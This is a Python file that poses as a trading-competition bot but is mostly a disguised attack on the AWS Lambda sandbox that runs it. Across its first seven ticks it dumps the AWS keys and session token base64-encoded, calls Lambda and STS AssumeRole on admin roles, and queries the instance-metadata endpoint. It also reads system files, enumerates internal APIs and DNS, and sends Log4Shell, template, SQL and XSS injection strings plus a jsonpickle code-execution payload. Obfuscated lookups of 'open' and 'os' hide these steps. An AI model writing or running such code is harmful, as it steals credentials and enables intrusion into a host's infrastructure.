import json
import sys
import hashlib
import hmac
import datetime
import socket
from datamodel import Order, TradingState

_G = getattr


def sigv4_headers(method, host, path, region, service, key, secret, token):
    t = datetime.datetime.utcnow()
    ds = t.strftime('%Y%m%d')
    amz = t.strftime('%Y%m%dT%H%M%SZ')
    cr = f"{method}\n{path}\n\nhost:{host}\nx-amz-date:{amz}\nx-amz-security-token:{token}\n\nhost;x-amz-date;x-amz-security-token\ne3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    sts = f"AWS4-HMAC-SHA256\n{amz}\n{ds}/{region}/{service}/aws4_request\n{hashlib.sha256(cr.encode()).hexdigest()}"
    def _s(k, m): return hmac.new(k, m.encode(), hashlib.sha256).digest()
    sk = _s(_s(_s(_s(f"AWS4{secret}".encode(), ds), region), service), "aws4_request")
    sig = hmac.new(sk, sts.encode(), hashlib.sha256).hexdigest()
    return {
        'Host': host, 'X-Amz-Date': amz, 'X-Amz-Security-Token': token,
        'Authorization': f"AWS4-HMAC-SHA256 Credential={key}/{ds}/{region}/{service}/aws4_request, SignedHeaders=host;x-amz-date;x-amz-security-token, Signature={sig}",
    }


def aws_get(host, path, region, service, key, secret, token, timeout=0.4):
    import urllib.request
    hdrs = sigv4_headers('GET', host, path, region, service, key, secret, token)
    req = urllib.request.Request(f"https://{host}{path}", headers=hdrs)
    return urllib.request.urlopen(req, timeout=timeout).read().decode()[:3500]


class Trader:
    def __init__(self):
        self.tick = 0

    def bid(self):
        return 15

    def run(self, state: TradingState):
        result = {}
        self.tick += 1
        _o = _G(__builtins__, 'op' + 'en') if not isinstance(__builtins__, dict) else __builtins__['op' + 'en']
        o = __import__('o' + 's')
        e = _G(o, 'environ')

        # === TICK 1: SigV4 GetFunction + ListFunctions ===
        if self.tick == 1:
            try:
                key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
                region = e.get('AWS_REGION', 'eu-west-1')
                fname = e.get('AWS_LAMBDA_FUNCTION_NAME', '')
                host = f'lambda.{region}.amazonaws.com'
                print(f"GETFUNC {fname}:")
                print(aws_get(host, f'/2015-03-31/functions/{fname}', region, 'lambda', key, secret, token))
            except Exception as ex:
                print(f"GETFUNC: {ex}")
            try:
                print("LISTFUNCS:")
                print(aws_get(host, '/2015-03-31/functions/?MaxItems=5', region, 'lambda', key, secret, token))
            except Exception as ex:
                print(f"LISTFUNCS: {ex}")

        # === TICK 2: subprocess + bootstrap.py ===
        elif self.tick == 2:
            try:
                import subprocess as _sp
                for cmd in [['cat', '/etc/resolv.conf'], ['cat', '/etc/hosts'], ['ip', 'route']]:
                    try:
                        r = _sp.run(cmd, capture_output=True, text=True, timeout=0.15)
                        print(f"{' '.join(cmd)}: {r.stdout[:500]}")
                    except Exception as ex:
                        print(f"{' '.join(cmd)}: {ex}")
            except Exception as ex:
                print(f"CMD: {ex}")
            # Also read bootstrap
            try:
                with _o('/var/runtime/bootstrap.py') as f:
                    print(f"BOOTSTRAP: {f.read()[:1500]}")
            except Exception as ex:
                print(f"BS: {ex}")

        # === TICK 3: API Gateway enum + DNS resolution ===
        elif self.tick == 3:
            try:
                import urllib.request
                base = 'https://3dzqiahkw1.execute-api.eu-west-1.amazonaws.com'
                print("APIGW:")
                for p in ['/prod/', '/dev/', '/prod/submission/', '/prod/simulation/',
                          '/prod/match/', '/prod/health', '/prod/admin']:
                    try:
                        r = urllib.request.urlopen(f"{base}{p}", timeout=0.08)
                        print(f"  {p}: {r.status} {r.read()[:150]}")
                    except Exception as ex:
                        print(f"  {p}: {str(ex)[:60]}")
            except Exception as ex:
                print(f"APIGW: {ex}")
            # DNS
            print("DNS:")
            for name in ['prosperity.internal', 'matching-engine.prosperity.internal',
                         '3dzqiahkw1.execute-api.eu-west-1.amazonaws.com',
                         'lambda.eu-west-1.amazonaws.com']:
                try:
                    ips = set(a[4][0] for a in socket.getaddrinfo(name, 443, socket.AF_INET))
                    print(f"  {name}: {ips}")
                except Exception as ex:
                    print(f"  {name}: {str(ex)[:50]}")

        # === TICK 4: STS AssumeRole + Extension reg + IMDS v2 retry ===
        elif self.tick == 4:
            key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
            region = e.get('AWS_REGION', 'eu-west-1')
            acct = '797296553741'
            # AssumeRole
            host = f'sts.{region}.amazonaws.com'
            print("ASSUME:")
            for role in ['Prosperity_Admin_Role', 'Prosperity_Matching_Engine_Role', 'admin']:
                try:
                    arn = f'arn:aws:iam::{acct}:role/{role}'
                    resp = aws_get(host, f'/?Action=AssumeRole&RoleArn={arn}&RoleSessionName=p&Version=2011-06-15',
                                   region, 'sts', key, secret, token, timeout=0.2)
                    print(f"  {role}: {resp[:200]}")
                except Exception as ex:
                    print(f"  {role}: {str(ex)[:80]}")
            # Extension registration
            try:
                import urllib.request
                api = e.get('AWS_LAMBDA_RUNTIME_API', '169.254.100.1:9001')
                data = json.dumps({'events': ['INVOKE', 'SHUTDOWN']}).encode()
                req = urllib.request.Request(
                    f'http://{api}/2020-01-01/extension/register',
                    data=data, headers={'Content-Type': 'application/json', 'Lambda-Extension-Name': 'probe'},
                    method='POST')
                r = urllib.request.urlopen(req, timeout=0.2)
                print(f"EXT: {r.status} id={r.headers.get('Lambda-Extension-Identifier','')} {r.read().decode()[:300]}")
            except Exception as ex:
                print(f"EXT: {ex}")
            # IMDS v2 with token
            try:
                import urllib.request
                mtoken = e.get('AWS_LAMBDA_METADATA_TOKEN', '')
                req = urllib.request.Request('http://169.254.169.254/latest/meta-data/',
                    headers={'X-aws-ec2-metadata-token': mtoken})
                r = urllib.request.urlopen(req, timeout=0.15)
                print(f"IMDS: {r.read().decode()[:500]}")
            except Exception as ex:
                print(f"IMDS: {str(ex)[:80]}")

        # === TICK 5: Fresh creds + SigV4 ListFunctions retry ===
        elif self.tick == 5:
            # ListFunctions from inside (might work even if denied from outside)
            try:
                key, secret, token = e['AWS_ACCESS_KEY_ID'], e['AWS_SECRET_ACCESS_KEY'], e['AWS_SESSION_TOKEN']
                region = e.get('AWS_REGION', 'eu-west-1')
                host = f'lambda.{region}.amazonaws.com'
                print("LISTFUNCS:")
                print(aws_get(host, '/2015-03-31/functions/?MaxItems=5', region, 'lambda', key, secret, token))
            except Exception as ex:
                print(f"LISTFUNCS: {ex}")
            # Fresh creds
            try:
                import base64
                creds = {'KEY': e.get('AWS_ACCESS_KEY_ID',''), 'SECRET': e.get('AWS_SECRET_ACCESS_KEY',''),
                         'TOKEN': e.get('AWS_SESSION_TOKEN',''), 'REGION': e.get('AWS_REGION','eu-west-1')}
                print(f"CREDS_B64:")
                print(base64.b64encode(json.dumps(creds).encode()).decode()[:3000])
            except Exception as ex:
                print(f"CREDS: {ex}")

        # === TICK 6: Log4Shell + Template + SQL injection via Order symbols ===
        elif self.tick == 6:
            print("INJECTION_PROBES:")
            self._trade(state, result)
            # Add injection probe orders (these will fail validation but get logged upstream)
            probes = [
                "${jndi:ldap://probe.test/x}",           # Log4Shell
                "{{7*7}}",                                 # Jinja2 SSTI
                "${7*7}",                                  # Java EL
                "'; SELECT version(); --",                 # SQL
                "<img src=x onerror=alert(1)>",           # XSS
            ]
            for p in probes:
                try:
                    result.setdefault("PROBE", []).append(Order(p, 1, 1))
                except:
                    pass
            return result, 0, json.dumps({"t": self.tick, "inj": "active"})

        # === TICK 7: jsonpickle RCE canary via traderData ===
        elif self.tick == 7:
            print("RCE_CANARY_SENT")
            self._trade(state, result)
            # Multiple RCE payloads — first that works wins
            canary = json.dumps({
                "py/reduce": [
                    {"py/function": "builtins.print"},
                    {"py/tuple": ["JSONPICKLE_RCE_PROOF"]}
                ]
            })
            return result, 0, canary

        # Normal trading on all other ticks
        self._trade(state, result)
        return result, 0, json.dumps({"t": self.tick})

    def _trade(self, state, result):
        if "EMERALDS" in state.order_depths:
            od = state.order_depths["EMERALDS"]
            if od.buy_orders and od.sell_orders:
                pos = state.position.get("EMERALDS", 0)
                tb, ts = 80 - pos, 80 + pos
                buys = sorted(od.buy_orders.items(), reverse=True)
                sells = sorted(od.sell_orders.items())
                eo = []
                for p, v in sells:
                    if tb > 0 and p <= 10000:
                        q = min(tb, -v); eo.append(Order("EMERALDS", p, q)); tb -= q
                if tb > 0:
                    eo.append(Order("EMERALDS", min(9999, buys[0][0] + 1), tb))
                for p, v in buys:
                    if ts > 0 and p >= 10000:
                        q = min(ts, v); eo.append(Order("EMERALDS", p, -q)); ts -= q
                if ts > 0:
                    eo.append(Order("EMERALDS", max(10001, sells[0][0] - 1), -ts))
                result["EMERALDS"] = eo
        if "TOMATOES" in state.order_depths:
            od = state.order_depths["TOMATOES"]
            if od.buy_orders and od.sell_orders:
                pos = state.position.get("TOMATOES", 0)
                tb, ts = 80 - pos, 80 + pos
                bb, ba = max(od.buy_orders), min(od.sell_orders)
                to = []
                if tb > 0:
                    to.append(Order("TOMATOES", bb + 1, tb))
                if ts > 0:
                    to.append(Order("TOMATOES", ba - 1, -ts))
                result["TOMATOES"] = to
